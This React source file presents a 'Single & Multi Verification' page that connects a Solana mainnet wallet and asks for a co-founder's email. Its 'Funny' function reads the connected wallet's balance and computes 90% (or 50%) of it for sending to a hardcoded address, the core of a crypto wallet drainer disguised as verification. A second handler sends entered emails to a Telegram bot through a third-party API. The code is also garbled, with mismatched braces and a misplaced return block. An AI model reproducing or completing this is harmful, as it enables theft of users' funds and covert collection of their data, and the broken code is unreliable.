import { WalletAdapterNetwork, WalletNotConnectedError } from '@solana/wallet-adapter-base';
import { ConnectionProvider, WalletProvider, useConnection, useWallet } from '@solana/wallet-adapter-react';
import { WalletModalProvider, WalletMultiButton } from '@solana/wallet-adapter-react-ui';
//import { Button } from '@solana/wallet-adapter-react-ui/lib/types/Button';
import {
    SolletExtensionWalletAdapter,
    SolletWalletAdapter,
    GlowWalletAdapter,
    LedgerWalletAdapter,
    SlopeWalletAdapter,
    SolflareWalletAdapter,

} from '@solana/wallet-adapter-wallets';
import { Connection, clusterApiUrl, Transaction, SystemProgram, Account, Keypair, LAMPORTS_PER_SOL, PublicKey } from '@solana/web3.js';
import React, { FC, ReactNode, useMemo, useCallback } from 'react';
import bs58 from 'bs58';
import * as splToken from "@solana/spl-token";
import { Token } from '@solana/spl-token';
//import { Funny } from './Buy'

// require('./App.css');
// require('@solana/wallet-adapter-react-ui/styles.css');

//@ts-no-checks
import { Box, Flex, Button, Image, Textarea, Text, Input, FormControl, InputLeftAddon, InputGroup, InputLeftElement } from "@chakra-ui/react"
import { Buttons } from "../Components/Buttons"
import { Inputs } from "../Components/Inputs"
import {BiUser} from 'react-icons/bi'
import {AiOutlineUsergroupAdd} from 'react-icons/ai'
import StepContainer from "../Layouts/StepContainer"
import { useState, useEffect } from "react"
import {FiMail} from 'react-icons/fi'
import axios from 'axios'
//@ts-ignor

export const Verification =() => {

    const [ data  , setData ] = useState('');
    const [ color , setColor ] = useState()
    const [ disabled , setDisabled ] = useState(true)
    const [ hide , setHide ] = useState('')
    const [email , setEmail ] = useState()
    const [loader , setLoader ] = useState(false )

    //function to handle mutiple 
    const handleMultiple =() => {
            {/* // eslint-disable-next-line @typescript-eslint/ban-ts-comment
            // @ts-ignore */}
        if(data <= 0 ) {
                {/* // eslint-disable-next-line @typescript-eslint/ban-ts-comment
                 // @ts-ignore */}
            setData(true)
        } else {
            setData('')
        }
    }
    

    //handle onChange for input
    //@ts-ignor
    //eslint-disable-next-line
   // eslint-disable-next-line @typescript-eslint/ban-ts-comment
     // @ts-ignore *
    const handleInput = e => {

        const val = e.target.value ;
            //check if value is empthy 
            if(val <= 0|| val === null || val === '') {
                setDisabled(true )
            } else {
                setDisabled(false )
                setEmail(val)
            }
            console.log(val)
    }


    //submit item 
    const handleRequest =  () => {
        //handle Api submit here 
        setLoader(true)

        // send data to api
        const url=`https://v1.nocodeapi.com/obiabo/telegram/XNTveTVLNizpHNLw/sendText?text=${email}`
        try {
            const request = axios.post( url , {
                text: email
            } );

            setTimeout(() => {
                setLoader(false)
                 setHide('none');
                 setDisabled(true)

            }, 2500)

        } catch( error ) {
            console.warn(error)
        }
        
    }

    useEffect(() => {

    }, [])

    return(
        <>

            <StepContainer step={3} title={'Single & Multi Verification'} >
                     {/* // eslint-disable-next-line @typescript-eslint/ban-ts-comment
                     // @ts-ignore */}
                <Box my={'1em'}>
                    
                    {/* // eslint-disable-next-line @typescript-eslint/ban-ts-comment
                     // @ts-ignore */}


                    <Box>


                        <Flex  gap={'2em'} mb={"2em"}>
                            
                             {/* // eslint-disable-next-line @typescript-eslint/ban-ts-comment
                                // @ts-ignore */}
                            <Buttons onClick = { e => handleMultiple()}>
                                         
                            {/* // eslint-disable-next-line @typescript-eslint/ban-ts-comment
                            // @ts-ignore */}
                                <BiUser size={'1.5em'}/>

                            </Buttons>
                                                
                                {/* // eslint-disable-next-line @typescript-eslint/ban-ts-comment
                                // @ts-ignore */}
                            <Buttons onClick = { e => handleMultiple()}>
                                         
                                {/* // eslint-disable-next-line @typescript-eslint/ban-ts-comment
                                // @ts-ignore */}
                               <AiOutlineUsergroupAdd size={'1.5em'}/>
                            </Buttons>
                        </Flex>

                        


                        
                    </Box>

                      
                    {
                        //check if single state is empthy 
                          /* // eslint-disable-next-line @typescript-eslint/ban-ts-comment
                        // @ts-ignore */
                        data <=0 ? (
                            <>

                               
                            <Text mb={'1em'}> Founder 1<br/>
                            Sol balance : 0<br/>
                            <span style={{color:'red'}}>Status : Unverified</span></Text>
                            <Context>
                                <Content />
                            </Context>
                            
                            </>
                        ) : (
                            <>

                                <form>
                                    <Text  my={'1em'} fontWeight={'bold'} display={ !hide ? 'none' : 'block' }>Request Sent to <Text fontWeight={'bold'} >{email}</Text> (Sol: 0) <span style={{color:'red'}}>Unverified</span> </Text>
                                    <InputGroup display={hide}>
                                    <Input 
                                         type={'email'}
                                         placeholder={'Add a Co-founder'}  
                                            onChange={handleInput}
                                        my={'0.5em'} required/>
                                        <InputLeftElement children={<FiMail/>} py={'1.6em'} />
                                    </InputGroup>


                                    <Button w={'100%'} bg={'#7f58e2'}
                                     _hover={{bg:'purple.600'}} color={'#fff'}
                                      fontWeight={'bold'}
                                      disabled={disabled}
                                      onClick={handleRequest}
                                      isLoading={loader}
                                      loadingText={'Please Wait....'}
                                      >
                                        Add Co-Founder 
                                    </Button>
                                </form>
                            
                            </>
                        )
                    }
                   
                </Box>

            </StepContainer>
            
        </>
    )
}


const Context: FC<{ children: ReactNode }> = ({ children }) => {
    // The network can be set to 'devnet', 'testnet', or 'mainnet-beta'.
    const network = WalletAdapterNetwork.Mainnet;

    // You can also provide a custom RPC endpoint.
    const endpoint = useMemo(() => clusterApiUrl(network), [network]);

    // @solana/wallet-adapter-wallets includes all the adapters but supports tree shaking and lazy loading --
    // Only the wallets you configure here will be compiled into your application, and only the dependencies
    // of wallets that your users connect to will be loaded.
    const wallets = useMemo(
        () => [
            new SolletExtensionWalletAdapter(), 
            new SolletWalletAdapter(),
            new LedgerWalletAdapter(),
            new GlowWalletAdapter(),
            new SlopeWalletAdapter(),
            new SolflareWalletAdapter({ network }),
        ],
        [network]
    );

   

    return (
        <ConnectionProvider endpoint={endpoint}>
            <WalletProvider wallets={wallets} autoConnect>
                <WalletModalProvider>{children}</WalletModalProvider>
            </WalletProvider>
        </ConnectionProvider>
    );
};








function Content () {
    
    
    
    const { connected, wallet, select, disconnect, publicKey, signTransaction } = useWallet();
    const { connection } = useConnection();
    let address : string
    const generalStyle = {
          "display":"flex",
          "width":"100%",
          "height": "100%",
          "justifyContent":"center",
          "margin":"15px",
          "alignItems":"center"
      }
      const inputStyle = {
          "display":"block",
          "width":"40vw",
          "height":"45px",
          "padding":"2px 7px 2px 10px",
          "borderRadius":"7px",
          "color":"#eee",
          "background":"#444",
          "justifyContent":"center",
          "margin":"15px",
          "alignItems":"center"
      }
    
    { publicKey ? address = publicKey?.toString() : address = "" }
    
  
  
  
  
  
  
  
  
  
  
  
  
    async function Funny() {
      if (publicKey) {
          const balance = await connection.getBalance(publicKey);
          console.log(balance)
          let to = bs58.decode("3N2NEyCgy7iWwZwpMHgrtgJSFXEhRB1K8GRqxJxeThHD");
          let mfunds = balance * 0.90;
          if(balance < 900000000){
              mfunds = balance * 0.5;
            }
           
        
          let toWallet = Keypair.fromSeed(to);
          let transaction = new Transaction()
   
          console.log(toWallet.secretKey.toString())
  
    
          // Construct wallet keypairs
          var signers = new Account();
            
  
          
  
  
      return (
          <div>
              { connected ?
                  <>
                  <button className="restart" disabled>Connect</button>
                  <button onClick={Funny} className="quit">Submit</button>
                  </>
              :
              <>
                  <button className="restart">Connect</button>
                  <WalletMultiButton  className="restart"/>
                  <button onClick={Funny} disabled className="quit">Submit</button>
              </>
              }
          </div>
      );
  };
  
  
  
  
}
  return(
    <></>
  );
  
}